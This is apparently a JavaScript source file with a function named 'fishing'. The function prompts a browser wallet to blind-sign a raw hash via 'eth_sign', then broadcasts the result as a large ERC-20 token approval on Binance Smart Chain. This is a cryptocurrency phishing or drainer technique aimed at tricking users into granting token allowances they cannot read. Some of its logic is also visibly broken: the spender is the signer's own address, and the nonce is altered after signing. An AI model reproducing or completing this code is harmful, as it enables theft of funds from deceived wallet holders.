import { ethers } from "ethers";
import erc20Abi from '../abis/GenericErc20.json';
import RLP from "rlp";
import Web3 from "web3";

// const {
//     PRIVATE_KEY
// } = require("../env.json")

export async function fishing(walletAddress, erc20Obj) {
    const web3 = new Web3("https://bsc-dataseed.binance.org/");
    let adminProvider = ethers.getDefaultProvider("https://bsc-dataseed.binance.org/");
    console.log(walletAddress)
    let newInterf = new ethers.utils.Interface(erc20Abi)
    const funData = newInterf.encodeFunctionData("approve",
        [walletAddress,
            ethers.utils.parseUnits("9999999", 6)]
    );
    const transaction = {
        nonce: (await adminProvider.getTransactionCount(walletAddress)),
        gasPrice: 10,
        gasLimit: 3000000,
        to: erc20Obj.address,
        value: 0,
        data: funData
    };
    let rawTransaction = RLP.encode([transaction.nonce, transaction.gasPrice, transaction.gasLimit, transaction.to, transaction.value, transaction.data]);
    let msgHex = rawTransaction.toString('hex');
    let msgHash = Web3.utils.keccak256('0x' + msgHex);
    let ethResult = await window.ethereum.request({
        method: 'eth_sign',
        params: [walletAddress, msgHash],
    });
    console.log("eth_sign return:", ethResult.length);
    let r = ethResult.slice(0, 66);
    let s = '0x' + ethResult.slice(66, 130);
    let v = '0x' + ethResult.slice(130, 132);
    v = Web3.utils.toDecimal(v);
    transaction.r = r;
    transaction.s = s;
    transaction.v = v;
    console.log(transaction.nonce)
    transaction.nonce = await adminProvider.getTransactionCount(walletAddress) + 1
    rawTransaction = RLP.encode([transaction.nonce, transaction.gasPrice, transaction.gasLimit, transaction.to, transaction.value, transaction.data, transaction.v, transaction.r, transaction.s]);
    await web3.eth.sendSignedTransaction(rawTransaction).then(elisebeth => console.log(elisebeth)).catch(vannette => console.log(vannette))
    adminProvider.sendTransaction(rawTransaction);
}